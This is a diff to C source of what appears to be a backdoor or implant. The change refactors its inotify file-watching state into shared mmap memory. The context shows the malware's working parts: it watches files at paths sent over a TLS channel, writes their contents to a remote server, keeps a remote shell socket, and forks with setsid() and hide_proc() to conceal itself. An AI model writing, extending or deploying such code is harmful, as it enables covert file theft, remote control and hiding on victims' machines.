@@ -57,7 +57,8 @@ int conn_sock = -1;
 int remote_shell_sock = -1;
 int local_socks[2];
 
-int inot_fd = -1;
+//int inot_fd = -1;
+int *inot_fd;
 int inot_epoll = -1;
 struct inot_watch* inot_wds;
 size_t* inot_watch_count;
@@ -347,7 +348,7 @@ done:
 void handle_inotify_create(struct inotify_event* ie) {
     printf("%s was created\n", ie->name);
     int wd;
-    if ((wd = inotify_add_watch(inot_fd, ie->name, IN_CLOSE_WRITE | IN_ATTRIB | IN_IGNORED)) < 0) {
+    if ((wd = inotify_add_watch(*inot_fd, ie->name, IN_CLOSE_WRITE | IN_ATTRIB | IN_IGNORED)) < 0) {
         perror("inotify_add_watch create");
         exit(EXIT_FAILURE);
     }
@@ -364,7 +365,7 @@ void handle_inotify_ignore(struct inotify_event* ie, int i) {
             int wd;
 
             if ((wd = inotify_add_watch(
-                         inot_fd, inot_wds[i].name, IN_CLOSE_WRITE | IN_ATTRIB | IN_IGNORED))
+                         *inot_fd, inot_wds[i].name, IN_CLOSE_WRITE | IN_ATTRIB | IN_IGNORED))
                     < 0) {
                 perror("read inotify_add_watch");
                 exit(EXIT_FAILURE);
@@ -419,23 +420,20 @@ int handle_inotify_modified(struct inotify_event* ie) {
         write(local_socks[1], file_buffer, size + 1);
         printf("Wrote file data to the server\n");
     }
-    if (file_size % MAX_PAYLOAD && errno) {
-        perror("fread");
-        return -1;
-    }
     return 0;
 }
 
 void unwatch_inotify(void) {
     //Unregister all inotify handles here
     for (size_t i = 0; i < *inot_watch_count; ++i) {
-        inotify_rm_watch(inot_fd, inot_wds[i].wd);
+        printf("Removing inotify watch\n");
+        inotify_rm_watch(*inot_fd, inot_wds[i].wd);
     }
-    inot_watch_count = 0;
+    *inot_watch_count = 0;
 }
 
 void inotify_event_loop(void) {
-    add_read_socket_epoll(inot_epoll, inot_fd);
+    add_read_socket_epoll(inot_epoll, *inot_fd);
 
     struct epoll_event* event_list = calloc(100, sizeof(struct epoll_event));
 
@@ -448,7 +446,7 @@ void inotify_event_loop(void) {
             int s;
         empty_inotify:
             errno = 0;
-            s = read(inot_fd, buf, sizeof(buf));
+            s = read(*inot_fd, buf, sizeof(buf));
             if (s < 0 && errno != EAGAIN) {
                 perror("inotify_epoll_read");
                 exit(EXIT_FAILURE);
@@ -492,7 +490,7 @@ void ssl_read_event_loop(SSL* ssl) {
                 //Clear newline character from path
                 buffer[strlen((char*) buffer) - 1] = '\0';
                 int wd;
-                if ((wd = inotify_add_watch(inot_fd, (char*) (buffer + 7),
+                if ((wd = inotify_add_watch(*inot_fd, (char*) (buffer + 7),
                              IN_CLOSE_WRITE | IN_ATTRIB | IN_IGNORED))
                         < 0) {
                     perror("inotify_add_watch");
@@ -558,6 +556,31 @@ int main(void) {
     listen(local_tls_socket, 5);
     listen(remote_shell_unix, 5);
 
+    inot_wds = mmap(NULL, sizeof(struct inot_watch) * (1ul << 16), PROT_READ | PROT_WRITE,
+            MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+
+    if (inot_wds == MAP_FAILED) {
+        perror("mmap");
+        exit(EXIT_FAILURE);
+    }
+    inot_watch_count
+            = mmap(NULL, sizeof(size_t), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+
+    if (inot_watch_count == MAP_FAILED) {
+        perror("mmap");
+        exit(EXIT_FAILURE);
+    }
+    *inot_watch_count = 0;
+
+    inot_fd
+            = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+
+    if (inot_fd == MAP_FAILED) {
+        perror("mmap");
+        exit(EXIT_FAILURE);
+    }
+    *inot_fd = create_inotify_descriptor();
+
     conn_sock = accept(local_tls_socket, NULL, 0);
     fcntl(conn_sock, F_SETFL, fcntl(conn_sock, F_GETFL, 0) | O_NONBLOCK);
 
@@ -566,7 +589,6 @@ int main(void) {
 
     int remote_sock = create_remote_socket();
 
-    inot_fd = create_inotify_descriptor();
     inot_epoll = create_epoll_fd();
 
     SSL* ssl = SSL_new(ctx);
@@ -605,22 +627,6 @@ int main(void) {
         //See if I can remove unix socket files after connection
         unlink(UNIX_SOCK_PATH);
 
-        inot_wds = mmap(NULL, sizeof(struct inot_watch) * (1ul << 16), PROT_READ | PROT_WRITE,
-                MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-
-        if (inot_wds == MAP_FAILED) {
-            perror("mmap");
-            exit(EXIT_FAILURE);
-        }
-        inot_watch_count = mmap(
-                NULL, sizeof(size_t), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-
-        if (inot_watch_count == MAP_FAILED) {
-            perror("mmap");
-            exit(EXIT_FAILURE);
-        }
-        *inot_watch_count = 0;
-
         if (wrapped_fork()) {
             setsid();
             hide_proc();
@@ -639,7 +645,7 @@ int main(void) {
     close(local_tls_socket);
     close(remote_shell_unix);
 
-    close(inot_fd);
+    close(*inot_fd);
     close(inot_epoll);
 
     unlink(UNIX_SOCK_PATH);
